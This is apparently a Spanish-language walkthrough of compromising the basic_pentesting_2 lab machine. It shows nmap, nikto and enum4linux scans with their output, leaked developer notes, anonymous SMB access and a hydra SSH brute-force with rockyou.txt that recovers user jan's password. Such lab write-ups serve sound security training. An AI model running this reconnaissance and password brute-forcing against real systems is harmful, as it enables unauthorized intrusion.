# Cómo he vulnerando la máquina basic_pentesting_2 

### Primero hice un reconicimiento de la red en busca de la IP de la máquina virtual (siendo que únicamente conozco la MAC y la red padre):

sudo netdiscover

nmap -sn 10.0.0.0/19

### Obtengo la IP de la máquina a atacar:

10.0.11.24

### Seguidamente hice un nmap -sV en busqueda de puertos abiertos junto al servicio que usa y su versión:
```
ismael@ismael-VirtualBox:~$ nmap -sV 10.0.11.24
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-19 15:22 CET
Nmap scan report for 10.0.11.24
Host is up (0.00037s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  microsoft-ds?
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
8080/tcp open  http          Apache Tomcat 9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.92 seconds
```
### Lo primero que hice fue acceder a la página web, mostrando que está en mantenimiento, seguidamente utilicé la herramienta nikto para detectar vulnerabilidades y endpoints, dando como resultado que encontré un endpoint llamado "/development", que contiene mensajes entre los desarrolladores de la página web
```
ismael@ismael-VirtualBox:~$ nikto -h http://10.0.11.24 -C all
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.0.11.24
+ Target Hostname:    10.0.11.24
+ Target Port:        80
+ Start Time:         2025-02-19 15:34:54 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x9e 0x56a870fbc8f28 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3268: /development/: Directory indexing found.
+ OSVDB-3092: /development/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-02-19 15:36:11 (GMT1) (77 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
### http://10.0.11.24/development/dev.txt
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
### http://10.0.11.24/development/j.txt
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
### Este endpoint de development también es accesible si visualizas el código funte de la página web, encontrado un comentario de desarrolladores en el cuerpo de la página

```
<!-- Check our dev note section if you need to know what to work on. -->
```
### Seguidamente use enum4linux para hacer un análisis del servidor de Samba para buscar información relevante
```
enum4linux -a 10.0.11.24
```
### Esto fué lo que encontré:
- Lista de usuarios conocidos
- Se puede acceder al servidor de forma anónima sin usuario ni contraseñas
- El nombre del gruopo de trabajo (aunque ya se pudo ver con nmap)
- Los usuarios del sistema operativo
- Política de contraseñas
```
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

[+] Server 10.0.11.24 allows sessions using username '', password ''

Domain Name: WORKGROUP

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

 =============================( Password Policy Information for 10.0.11.24 )=============================

[+] Attaching to 10.0.11.24 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] BASIC2
	[+] Builtin

[+] Password Info for Domain: BASIC2

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 

```
### Ya que se puede acceder por usuario anónimo, intenté acceder, sin encontrar nada realmente valioso aparte de un fichero llamado staff.txt sin información relevante
```
smbclient //10.0.11.24/Anonymous -U ""
```
### Después probé a lanzar hydra con la lista de contraseñas "rockyou.txt" para intear acceder al usuario del sistema operativo "jan", obteniendo así su contraseña
```
hydra -l jan -P Desktop/rockyou.txt ssh://10.0.11.24 -t 64 

[22][ssh] host: 10.0.11.24   login: jan   password: armando
```
### (La demonstración de que realmente obtuve acceso a la máquina está junto a este fichero)